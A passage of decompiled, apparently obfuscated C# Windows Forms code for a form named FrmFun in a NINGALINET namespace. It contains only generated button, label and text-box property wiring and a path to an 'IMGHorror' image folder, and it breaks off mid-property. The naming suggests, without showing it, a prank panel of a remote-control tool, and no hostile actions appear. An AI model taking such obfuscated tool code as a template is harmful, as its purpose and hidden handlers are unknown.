using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x02000015 RID: 21
	[DesignerGenerated]
	public partial class FrmFun : Form
	{
		// Token: 0x06000479 RID: 1145 RVA: 0x0000381C File Offset: 0x00001A1C
		[DebuggerNonUserCode]
		static FrmFun()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmFun.__ENCList = new List<WeakReference>();
		}

		// Token: 0x0600047A RID: 1146 RVA: 0x00028D70 File Offset: 0x00026F70
		public FrmFun()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.FormClosing += new FormClosingEventHandler(this.Form9_FormClosing);
			base.Load += new EventHandler(this.Form9_Load);
			FrmFun.__ENCAddToList(this);
			this.folder = Application.StartupPath + "\\IMGHorror\\";
			this.InitializeComponent();
		}

		// Token: 0x0600047B RID: 1147 RVA: 0x00028DD0 File Offset: 0x00026FD0
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmFun.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmFun.__ENCList.Count == FrmFun.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmFun.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmFun.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmFun.__ENCList[num] = FrmFun.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmFun.__ENCList.RemoveRange(num, FrmFun.__ENCList.Count - num);
						FrmFun.__ENCList.Capacity = FrmFun.__ENCList.Count;
					}
					FrmFun.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x170001B8 RID: 440
		// (get) Token: 0x0600047E RID: 1150 RVA: 0x0002D770 File Offset: 0x0002B970
		// (set) Token: 0x0600047F RID: 1151 RVA: 0x0002D788 File Offset: 0x0002B988
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				if (this._Button2 != null)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				if (this._Button2 != null)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x170001B9 RID: 441
		// (get) Token: 0x06000480 RID: 1152 RVA: 0x0002D7E0 File Offset: 0x0002B9E0
		// (set) Token: 0x06000481 RID: 1153 RVA: 0x0002D7F8 File Offset: 0x0002B9F8
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x170001BA RID: 442
		// (get) Token: 0x06000482 RID: 1154 RVA: 0x0002D850 File Offset: 0x0002BA50
		// (set) Token: 0x06000483 RID: 1155 RVA: 0x0002D868 File Offset: 0x0002BA68
		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				if (this._Button3 != null)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				if (this._Button3 != null)
				{
					this._Button3.Click += value2;
				}
			}
		}

		// Token: 0x170001BB RID: 443
		// (get) Token: 0x06000484 RID: 1156 RVA: 0x0002D8C0 File Offset: 0x0002BAC0
		// (set) Token: 0x06000485 RID: 1157 RVA: 0x0002D8D8 File Offset: 0x0002BAD8
		internal virtual Button Button4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button4_Click);
				if (this._Button4 != null)
				{
					this._Button4.Click -= value2;
				}
				this._Button4 = value;
				if (this._Button4 != null)
				{
					this._Button4.Click += value2;
				}
			}
		}

		// Token: 0x170001BC RID: 444
		// (get) Token: 0x06000486 RID: 1158 RVA: 0x0002D930 File Offset: 0x0002BB30
		// (set) Token: 0x06000487 RID: 1159 RVA: 0x0002D948 File Offset: 0x0002BB48
		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click);
				if (this._Button5 != null)
				{
					this._Button5.Click -= value2;
				}
				this._Button5 = value;
				if (this._Button5 != null)
				{
					this._Button5.Click += value2;
				}
			}
		}

		// Token: 0x170001BD RID: 445
		// (get) Token: 0x06000488 RID: 1160 RVA: 0x0002D9A0 File Offset: 0x0002BBA0
		// (set) Token: 0x06000489 RID: 1161 RVA: 0x0002D9B8 File Offset: 0x0002BBB8
		internal virtual Button Button6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button6_Click);
				if (this._Button6 != null)
				{
					this._Button6.Click -= value2;
				}
				this._Button6 = value;
				if (this._Button6 != null)
				{
					this._Button6.Click += value2;
				}
			}
		}

		// Token: 0x170001BE RID: 446
		// (get) Token: 0x0600048A RID: 1162 RVA: 0x0002DA10 File Offset: 0x0002BC10
		// (set) Token: 0x0600048B RID: 1163 RVA: 0x0002DA28 File Offset: 0x0002BC28
		internal virtual Button Button7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button7_Click);
				if (this._Button7 != null)
				{
					this._Button7.Click -= value2;
				}
				this._Button7 = value;
				if (this._Button7 != null)
				{
					this._Button7.Click += value2;
				}
			}
		}

		// Token: 0x170001BF RID: 447
		// (get) Token: 0x0600048C RID: 1164 RVA: 0x0002DA80 File Offset: 0x0002BC80
		// (set) Token: 0x0600048D RID: 1165 RVA: 0x0002DA98 File Offset: 0x0002BC98
		internal virtual Button Button8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button8_Click);
				if (this._Button8 != null)
				{
					this._Button8.Click -= value2;
				}
				this._Button8 = value;
				if (this._Button8 != null)
				{
					this._Button8.Click += value2;
				}
			}
		}

		// Token: 0x170001C0 RID: 448
		// (get) Token: 0x0600048E RID: 1166 RVA: 0x0002DAF0 File Offset: 0x0002BCF0
		// (set) Token: 0x0600048F RID: 1167 RVA: 0x0002DB08 File Offset: 0x0002BD08
		internal virtual Button Button11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button11_Click);
				if (this._Button11 != null)
				{
					this._Button11.Click -= value2;
				}
				this._Button11 = value;
				if (this._Button11 != null)
				{
					this._Button11.Click += value2;
				}
			}
		}

		// Token: 0x170001C1 RID: 449
		// (get) Token: 0x06000490 RID: 1168 RVA: 0x0002DB60 File Offset: 0x0002BD60
		// (set) Token: 0x06000491 RID: 1169 RVA: 0x0002DB78 File Offset: 0x0002BD78
		internal virtual Button Button12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button12_Click);
				if (this._Button12 != null)
				{
					this._Button12.Click -= value2;
				}
				this._Button12 = value;
				if (this._Button12 != null)
				{
					this._Button12.Click += value2;
				}
			}
		}

		// Token: 0x170001C2 RID: 450
		// (get) Token: 0x06000492 RID: 1170 RVA: 0x0002DBD0 File Offset: 0x0002BDD0
		// (set) Token: 0x06000493 RID: 1171 RVA: 0x0002DBE8 File Offset: 0x0002BDE8
		internal virtual Button Button13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button13_Click);
				if (this._Button13 != null)
				{
					this._Button13.Click -= value2;
				}
				this._Button13 = value;
				if (this._Button13 != null)
				{
					this._Button13.Click += value2;
				}
			}
		}

		// Token: 0x170001C3 RID: 451
		// (get) Token: 0x06000494 RID: 1172 RVA: 0x0002DC40 File Offset: 0x0002BE40
		// (set) Token: 0x06000495 RID: 1173 RVA: 0x0002DC58 File Offset: 0x0002BE58
		internal virtual Button Button14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button14_Click);
				if (this._Button14 != null)
				{
					this._Button14.Click -= value2;
				}
				this._Button14 = value;
				if (this._Button14 != null)
				{
					this._Button14.Click += value2;
				}
			}
		}

		// Token: 0x170001C4 RID: 452
		// (get) Token: 0x06000496 RID: 1174 RVA: 0x0002DCB0 File Offset: 0x0002BEB0
		// (set) Token: 0x06000497 RID: 1175 RVA: 0x0002DCC8 File Offset: 0x0002BEC8
		internal virtual Button Button15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button15_Click);
				if (this._Button15 != null)
				{
					this._Button15.Click -= value2;
				}
				this._Button15 = value;
				if (this._Button15 != null)
				{
					this._Button15.Click += value2;
				}
			}
		}

		// Token: 0x170001C5 RID: 453
		// (get) Token: 0x06000498 RID: 1176 RVA: 0x0002DD20 File Offset: 0x0002BF20
		// (set) Token: 0x06000499 RID: 1177 RVA: 0x0002DD38 File Offset: 0x0002BF38
		internal virtual Button Button16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button16_Click);
				if (this._Button16 != null)
				{
					this._Button16.Click -= value2;
				}
				this._Button16 = value;
				if (this._Button16 != null)
				{
					this._Button16.Click += value2;
				}
			}
		}

		// Token: 0x170001C6 RID: 454
		// (get) Token: 0x0600049A RID: 1178 RVA: 0x0002DD90 File Offset: 0x0002BF90
		// (set) Token: 0x0600049B RID: 1179 RVA: 0x0002DDA8 File Offset: 0x0002BFA8
		internal virtual Button Button17
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button17;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button17_Click);
				if (this._Button17 != null)
				{
					this._Button17.Click -= value2;
				}
				this._Button17 = value;
				if (this._Button17 != null)
				{
					this._Button17.Click += value2;
				}
			}
		}

		// Token: 0x170001C7 RID: 455
		// (get) Token: 0x0600049C RID: 1180 RVA: 0x0002DE00 File Offset: 0x0002C000
		// (set) Token: 0x0600049D RID: 1181 RVA: 0x0002DE18 File Offset: 0x0002C018
		internal virtual Button Button18
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button18;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button18_Click);
				if (this._Button18 != null)
				{
					this._Button18.Click -= value2;
				}
				this._Button18 = value;
				if (this._Button18 != null)
				{
					this._Button18.Click += value2;
				}
			}
		}

		// Token: 0x170001C8 RID: 456
		// (get) Token: 0x0600049E RID: 1182 RVA: 0x0002DE70 File Offset: 0x0002C070
		// (set) Token: 0x0600049F RID: 1183 RVA: 0x0002DE88 File Offset: 0x0002C088
		internal virtual Button Button9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button9_Click);
				if (this._Button9 != null)
				{
					this._Button9.Click -= value2;
				}
				this._Button9 = value;
				if (this._Button9 != null)
				{
					this._Button9.Click += value2;
				}
			}
		}

		// Token: 0x170001C9 RID: 457
		// (get) Token: 0x060004A0 RID: 1184 RVA: 0x0002DEE0 File Offset: 0x0002C0E0
		// (set) Token: 0x060004A1 RID: 1185 RVA: 0x0002DEF8 File Offset: 0x0002C0F8
		internal virtual Button Button10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button10_Click);
				if (this._Button10 != null)
				{
					this._Button10.Click -= value2;
				}
				this._Button10 = value;
				if (this._Button10 != null)
				{
					this._Button10.Click += value2;
				}
			}
		}

		// Token: 0x170001CA RID: 458
		// (get) Token: 0x060004A2 RID: 1186 RVA: 0x0002DF50 File Offset: 0x0002C150
		// (set) Token: 0x060004A3 RID: 1187 RVA: 0x0002DF68 File Offset: 0x0002C168
		internal virtual Button Button29
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button29;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button29_Click);
				if (this._Button29 != null)
				{
					this._Button29.Click -= value2;
				}
				this._Button29 = value;
				if (this._Button29 != null)
				{
					this._Button29.Click += value2;
				}
			}
		}

		// Token: 0x170001CB RID: 459
		// (get) Token: 0x060004A4 RID: 1188 RVA: 0x0002DFC0 File Offset: 0x0002C1C0
		// (set) Token: 0x060004A5 RID: 1189 RVA: 0x0002DFD8 File Offset: 0x0002C1D8
		internal virtual Button Button28
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button28;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button28_Click);
				if (this._Button28 != null)
				{
					this._Button28.Click -= value2;
				}
				this._Button28 = value;
				if (this._Button28 != null)
				{
					this._Button28.Click += value2;
				}
			}
		}

		// Token: 0x170001CC RID: 460
		// (get) Token: 0x060004A6 RID: 1190 RVA: 0x0002E030 File Offset: 0x0002C230
		// (set) Token: 0x060004A7 RID: 1191 RVA: 0x0002E048 File Offset: 0x0002C248
		internal virtual Button Button26
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button26;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button26_Click);
				if (this._Button26 != null)
				{
					this._Button26.Click -= value2;
				}
				this._Button26 = value;
				if (this._Button26 != null)
				{
					this._Button26.Click += value2;
				}
			}
		}

		// Token: 0x170001CD RID: 461
		// (get) Token: 0x060004A8 RID: 1192 RVA: 0x0002E0A0 File Offset: 0x0002C2A0
		// (set) Token: 0x060004A9 RID: 1193 RVA: 0x0002E0B8 File Offset: 0x0002C2B8
		internal virtual Button Button33
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button33;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button33_Click);
				if (this._Button33 != null)
				{
					this._Button33.Click -= value2;
				}
				this._Button33 = value;
				if (this._Button33 != null)
				{
					this._Button33.Click += value2;
				}
			}
		}

		// Token: 0x170001CE RID: 462
		// (get) Token: 0x060004AA RID: 1194 RVA: 0x0002E110 File Offset: 0x0002C310
		// (set) Token: 0x060004AB RID: 1195 RVA: 0x0002E128 File Offset: 0x0002C328
		internal virtual Button Button32
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button32;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button32_Click);
				if (this._Button32 != null)
				{
					this._Button32.Click -= value2;
				}
				this._Button32 = value;
				if (this._Button32 != null)
				{
					this._Button32.Click += value2;
				}
			}
		}

		// Token: 0x170001CF RID: 463
		// (get) Token: 0x060004AC RID: 1196 RVA: 0x0002E180 File Offset: 0x0002C380
		// (set) Token: 0x060004AD RID: 1197 RVA: 0x0002E198 File Offset: 0x0002C398
		internal virtual Button Button30
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button30;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button30_Click);
				if (this._Button30 != null)
				{
					this._Button30.Click -= value2;
				}
				this._Button30 = value;
				if (this._Button30 != null)
				{
					this._Button30.Click += value2;
				}
			}
		}

		// Token: 0x170001D0 RID: 464
		// (get) Token: 0x060004AE RID: 1198 RVA: 0x0002E1F0 File Offset: 0x0002C3F0
		// (set) Token: 0x060004AF RID: 1199 RVA: 0x0002E208 File Offset: 0x0002C408
		internal virtual Button Button31
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button31;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button31_Click);
				if (this._Button31 != null)
				{
					this._Button31.Click -= value2;
				}
				this._Button31 = value;
				if (this._Button31 != null)
				{
					this._Button31.Click += value2;
				}
			}
		}

		// Token: 0x170001D1 RID: 465
		// (get) Token: 0x060004B0 RID: 1200 RVA: 0x0002E260 File Offset: 0x0002C460
		// (set) Token: 0x060004B1 RID: 1201 RVA: 0x0000382D File Offset: 0x00001A2D
		internal virtual Button Button24
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button24;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button24 = value;
			}
		}

		// Token: 0x170001D2 RID: 466
		// (get) Token: 0x060004B2 RID: 1202 RVA: 0x0002E278 File Offset: 0x0002C478
		// (set) Token: 0x060004B3 RID: 1203 RVA: 0x00003836 File Offset: 0x00001A36
		internal virtual Button Button25
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button25;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button25 = value;
			}
		}

		// Token: 0x170001D3 RID: 467
		// (get) Token: 0x060004B4 RID: 1204 RVA: 0x0002E290 File Offset: 0x0002C490
		// (set) Token: 0x060004B5 RID: 1205 RVA: 0x0002E2A8 File Offset: 0x0002C4A8
		internal virtual Button Button19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button19_Click);
				if (this._Button19 != null)
				{
					this._Button19.Click -= value2;
				}
				this._Button19 = value;
				if (this._Button19 != null)
				{
					this._Button19.Click += value2;
				}
			}
		}

		// Token: 0x170001D4 RID: 468
		// (get) Token: 0x060004B6 RID: 1206 RVA: 0x0002E300 File Offset: 0x0002C500
		// (set) Token: 0x060004B7 RID: 1207 RVA: 0x0002E318 File Offset: 0x0002C518
		internal virtual Button Button20
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button20;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button20_Click);
				if (this._Button20 != null)
				{
					this._Button20.Click -= value2;
				}
				this._Button20 = value;
				if (this._Button20 != null)
				{
					this._Button20.Click += value2;
				}
			}
		}

		// Token: 0x170001D5 RID: 469
		// (get) Token: 0x060004B8 RID: 1208 RVA: 0x0002E370 File Offset: 0x0002C570
		// (set) Token: 0x060004B9 RID: 1209 RVA: 0x0002E388 File Offset: 0x0002C588
		internal virtual Button Button21
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button21;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button21_Click);
				if (this._Button21 != null)
				{
					this._Button21.Click -= value2;
				}
				this._Button21 = value;
				if (this._Button21 != null)
				{
					this._Button21.Click += value2;
				}
			}
		}

		// Token: 0x170001D6 RID: 470
		// (get) Token: 0x060004BA RID: 1210 RVA: 0x0002E3E0 File Offset: 0x0002C5E0
		// (set) Token: 0x060004BB RID: 1211 RVA: 0x0002E3F8 File Offset: 0x0002C5F8
		internal virtual Button Button22
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button22;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button22_Click);
				if (this._Button22 != null)
				{
					this._Button22.Click -= value2;
				}
				this._Button22 = value;
				if (this._Button22 != null)
				{
					this._Button22.Click += value2;
				}
			}
		}

		// Token: 0x170001D7 RID: 471
		// (get) Token: 0x060004BC RID: 1212 RVA: 0x0002E450 File Offset: 0x0002C650
		// (set) Token: 0x060004BD RID: 1213 RVA: 0x0002E468 File Offset: 0x0002C668
		internal virtual Button Button23
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button23;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button23_Click);
				if (this._Button23 != null)
				{
					this._Button23.Click -= value2;
				}
				this._Button23 = value;
				if (this._Button23 != null)
				{
					this._Button23.Click += value2;
				}
			}
		}

		// Token: 0x170001D8 RID: 472
		// (get) Token: 0x060004BE RID: 1214 RVA: 0x0002E4C0 File Offset: 0x0002C6C0
		// (set) Token: 0x060004BF RID: 1215 RVA: 0x0000383F File Offset: 0x00001A3F
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x170001D9 RID: 473
		// (get) Token: 0x060004C0 RID: 1216 RVA: 0x0002E4D8 File Offset: 0x0002C6D8
		// (set) Token: 0x060004C1 RID: 1217 RVA: 0x00003848 File Offset: 0x00001A48
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x170001DA RID: 474
		// (get) Token: 0x060004C2 RID: 1218 RVA: 0x0002E4F0 File Offset: 0x0002C6F0
		// (set) Token: 0x060004C3 RID: 1219 RVA: 0x00003851 File Offset: 0x00001A51
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x170001DB RID: 475
		// (get) Token: 0x060004C4 RID: 1220 RVA: 0x0002E508 File Offset: 0x0002C708
		// (set) Token: 0x060004C5 RID: 1221 RVA: 0x0000385A File Offset: 0x00001A5A
		internal virtual TextBox TextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox2 = value;
			}
		}

		// Token: 0x170001DC RID: 476
		// (get) Token: 0x060004C6 RID: 1222 RVA: 0x0002E520 File Offset: 0x0002C720
		// (set) Token: 0x060004C7 RID: 1223 RVA: 0x0002E538 File Offset: 0x0002C738
		internal virtual Button Button40
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button40;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button40_Click);
				if (this._Button40 != null)
				{
					this._Button40.Click -= value2;
				}
				this._Button40 = value;
				if (this._Button40 != null)
				{
					this._Button40.Click += value2;
				}
			}
		}

		// Token: 0x170001DD RID: 477
		// (get) Token: 0x060004C8 RID: 1224 RVA: 0x0002E590 File Offset: 0x0002C790
		// (set) Token: 0x060004C9 RID: 1225 RVA: 0x0002E5A8 File Offset: 0x0002C7A8
		internal virtual Button Button41
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button41;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button41_Click);
				if (this._Button41 != null)
				{
					this._Button41.Click -= value2;
				}
				this._Button41 = value;
				if (this._Button41 != null)
				{
					this._Button41.Click += value2;
				}
			}
		}

		// Token: 0x170001DE RID: 478
		// (get) Token: 0x060004CA RID: 1226 RVA: 0x0002E600 File Offset: 0x0002C800
		// (set) Token: 0x060004CB RID: 1227 RVA: 0x0002E618 File Offset: 0x0002C818
		internal virtual Button Button42
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button42;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button42_Click);
				if (this._Button42 != null)
				{
					this._Button42.Click -= value2;
				}
				this._Button42 = value;
				if (this._Button42 != null)
				{
					this._Button42.Click += value2;
				}
			}
		}

		// Token: 0x170001DF RID: 479
		// (get) Token: 0x060004CC RID: 1228 RVA: 0x0002E670 File Offset: 0x0002C870
		// (set) Token: 0x060004CD RID: 1229 RVA: 0x0002E688 File Offset: 0x0002C888
		internal virtual Button Button44
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button44;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button44_Click);
				if (this._Button44 != null)
				{
					this._Button44.Click -= value2;
				}
				this._Button44 = value;
				if (this._Button44 != null)
				{
					this._Button44.Click += value2;
				}
			}
		}

		// Token: 0x170001E0 RID: 480
		// (get) Token: 0x060004CE RID: 1230 RVA: 0x0002E6E0 File Offset: 0x0002C8E0
		// (set) Token: 0x060004CF RID: 1231 RVA: 0x0002E6F8 File Offset: 0x0002C8F8
		internal virtual Button Button45
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button45;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button45_Click);
				if (this._Button45 != null)
				{
					this._Button45.Click -= value2;
				}
				this._Button45 = value;
				if (this._Button45 != null)
				{
					this._Button45.Click += value2;
				}
			}
		}

		// Token: 0x170001E1 RID: 481
		// (get) Token: 0x060004D0 RID: 1232 RVA: 0x0002E750 File Offset: 0x0002C950
		// (set) Token: 0x060004D1 RID: 1233 RVA: 0x0002E768 File Offset: 0x0002C968
		internal virtual Button Button46
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button46;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button46_Click);
				if (this._Button46 != null)
				{
					this._Button46.Click -= value2;
				}
				this._Button46 = value;
				if (this._Button46 != null)
				{
					this._Button46.Click += value2;
				}
			}
		}

		// Token: 0x170001E2 RID: 482
		// (get) Token: 0x060004D2 RID: 1234 RVA: 0x0002E7C0 File Offset: 0x0002C9C0
		// (set) Token: 0x060004D3 RID: 1235 RVA: 0x0002E7D8 File Offset: 0x0002C9D8
		internal virtual Button Button47
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button47;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button47_Click);
				if (this._Button47 != null)
				{
					this._Button47.Click -= value2;
				}
				this._Button47 = value;
				if (this._Button47 != null)
				{
					this._Button47.Click += value2;
				}
			}
		}

		// Token: 0x170001E3 RID: 483
		// (get) Token: 0x060004D4 RID: 1236 RVA: 0x0002E830 File Offset: 0x0002CA30
		// (set) Token: 0x060004D5 RID: 1237 RVA: 0x0002E848 File Offset: 0x0002CA48
		internal virtual Button Button48
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button48;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button48_Click);
				if (this._Button48 != null)
				{
					this._Button48.Click -= value2;
				}
				this._Button48 = value;
				if (this._Button48 != null)
				{
					this._Button48.Click += value2;
				}
			}
		}

		// Token: 0x170001E4 RID: 484
		// (get) Token: 0x060004D6 RID: 1238 RVA: 0x0002E8A0 File Offset: 0x0002CAA0
		// (set) Token: 0x060004D7 RID: 1239 RVA: 0x0002E8B8 File Offset: 0x0002CAB8
		internal virtual Button Button49
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button49;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button49_Click);
				if (this._Button49 != null)
